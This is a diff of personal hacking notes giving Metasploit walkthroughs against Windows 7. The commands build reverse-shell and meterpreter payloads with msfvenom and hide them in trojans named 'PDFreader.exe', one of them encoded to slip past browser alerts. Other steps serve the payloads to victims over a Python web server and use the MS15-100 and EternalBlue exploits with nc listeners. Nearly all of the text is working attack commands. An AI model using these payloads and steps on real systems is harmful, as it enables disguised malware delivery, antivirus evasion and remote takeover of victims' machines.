@@ -8,8 +8,8 @@
 > apt install metasploit-framework
 > msfvenom -l payloads                                    (choose a payload)
 > msfvenom --list formats                                 (choose a format accordingly)
-> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=192.168.0.4 Lport=4444 -f exe > /root/Downloads/shell_reverse.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as )
-> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=192.168.0.4 Lport=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
+> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=local_ip Lport=4444 -f exe > /root/Downloads/shell_reverse.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as )
+> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=local_ip Lport=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
 > hexdump -C shell_reverse.exe | less                     ( check the exe file, 4d 5a - MZ represents its a exe file)
 > python3 -m http.server (to download the exe file over web on victim machine) - let it run
 > install shell_reverse.exe file from web on victim machine
@@ -30,8 +30,8 @@
 --Hacking windows 7 with & without trojan with nc--
 
 
-> msfvenom - windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=192.168.1.1 -f exe -o inject.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as ) -- without trojan
-> > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
+> msfvenom - windows/shell_reverse_tcp LHOST=local_ip LPORT=port -f exe -o inject.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as ) -- without trojan
+> > msfvenom -p windows/shell_reverse_tcp LHOST=local_ip LPORT=port -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
 > hexdump -C inject.exe | less
 > python3 -m http.server
 > install inject.exe file from web on victim machine
@@ -47,7 +47,6 @@
 
 --MS15-100 Microsoft Windows Media Center MCL Vulnerability--
 
-
 > msfconsole
 > search ms15_100_mcl (copy the module name)
 > use exploit/windows/fileformat/ms15_100_mcl_exe
@@ -55,8 +54,8 @@
 > set PAYLOAD windows/meterpreter/reverse_tcp
 > set LHOST local_ip
 > exploit
-> copy the 'malicious executable at' (\\192.168.0.6\hUoNjR\pdfreader.exe)
-> open target machine and search \\192.168.0.6\hUoNjR\pdfreader.exe on browser
+> copy the 'malicious executable at' (\\local_ip\hUoNjR\pdfreader.exe)
+> open target machine and search \\local_ip\hUoNjR\pdfreader.exe on browser
 > run the service
 > check the terminal in attack machine
 > ctrl c
@@ -74,7 +73,6 @@
 
 
 --MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption--
-
 
 > msfconsole
 > search eternal
@@ -99,3 +97,15 @@
 > set lport local_port
 > set payload windows/meterpreter/reverse_tcp
 > exploit
+
+
+
+--Hacking windows 7 with encoded trojan file with nc--
+
+> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.6 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /root/Downloads/the_app_needed_by_victim.exe -o pdfreader.exe
+> python3 -m http.server
+> go to target machine and browse local_ip:port
+> download the pdfreader file (we see no error message or alert message from browser)
+> nc -nlvp local_port (on attack machine)
+> run the application on target machine
+> check the terminal over attack machine
